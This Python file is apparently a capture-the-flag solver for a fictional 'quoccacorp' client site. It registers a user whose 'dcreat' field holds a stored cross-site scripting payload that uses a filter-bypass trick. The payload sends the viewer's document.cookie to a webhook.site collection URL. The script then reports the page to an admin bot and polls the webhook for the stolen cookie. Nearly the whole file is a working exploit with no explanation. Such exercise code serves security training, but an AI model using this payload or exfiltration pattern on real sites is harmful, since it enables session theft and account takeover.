import sys
from pathlib import Path
sys.path.append(str(Path(__file__).resolve().parent.parent))
from utils import get_session, find_flag

from bs4 import BeautifulSoup

class Solver:
    def __init__(self):
        self.session = get_session()
        self.webhooksite_uuid = self.session.post("https://webhook.site/token").json()["uuid"]
        self.webhooksite_url = f"https://webhook.site/{self.webhooksite_uuid}"
        self.webhooksite_view_url = f"https://webhook.site/#!/view/{self.webhooksite_uuid}"
        self.webhooksite_requests_url = f"https://webhook.site/token/{self.webhooksite_uuid}/requests"

    def find_flag_webhooksite(self, delay_seconds=2):
        import time, json
        time.sleep(delay_seconds)
        response = self.session.get(self.webhooksite_requests_url)
        response_json = response.json()
        response_json_text = json.dumps(response_json, indent=2)
        find_flag(response_json_text)

    def generate_random_string(self, length = 10):
        import random, string
        return ''.join(random.choices(string.ascii_letters, k=length))

    def main(self):
        BASE_URL = "https://clients.quoccacorp.com"
        PAYLOAD = f'''<<script>Xscript>fetch(`{self.webhooksite_url}?q=${{document.cookie}}`);</script>'''

        random_string = self.generate_random_string()
        new_user_data = {
            "fname": random_string,
            "lname": random_string,
            "email": f"{random_string}@quoccacorp.com", # The "email" field must contain a valid email
            "mobile": random_string,
            "address": random_string,
            "address2": random_string,
            "inputCity": random_string,
            "inputState": random_string,
            "inputZip": random_string,
            "snormal": random_string,
            "dcreat": PAYLOAD,
            "gridCheck": "on" # No restrictions found on the "gridCheck" field
        }

        assert len(new_user_data["fname"]) >= 1 and len(new_user_data["fname"]) <= 100
        assert len(new_user_data["lname"]) >= 1 and len(new_user_data["lname"]) <= 100
        assert len(new_user_data["mobile"]) >= 6 and len(new_user_data["mobile"]) <= 10
        assert len(new_user_data["address"]) <= 100
        assert len(new_user_data["address2"]) <= 100
        assert len(new_user_data["inputCity"]) >= 1 and len(new_user_data["inputCity"]) <= 20
        assert len(new_user_data["inputState"]) >= 1 and len(new_user_data["inputState"]) <= 10
        assert len(new_user_data["inputZip"]) >= 1 and len(new_user_data["inputZip"]) <= 10
        assert len(new_user_data["snormal"]) >= 1 and len(new_user_data["snormal"]) <= 10
        assert len(new_user_data["dcreat"]) >= 1 and len(new_user_data["dcreat"]) <= 500

        self.session.post(f"{BASE_URL}/create_user", data=new_user_data)

        # response = self.session.get(BASE_URL)
        # soup = BeautifulSoup(response.text, "html.parser")
        # top_row_dcreat_td_element = soup.find("td", style="display:none;")
        # print(top_row_dcreat_td_element.prettify())

        # Report Home Page to Admin
        self.session.post(f"{BASE_URL}/report")
        self.find_flag_webhooksite()

if __name__ == "__main__":
    Solver().main()
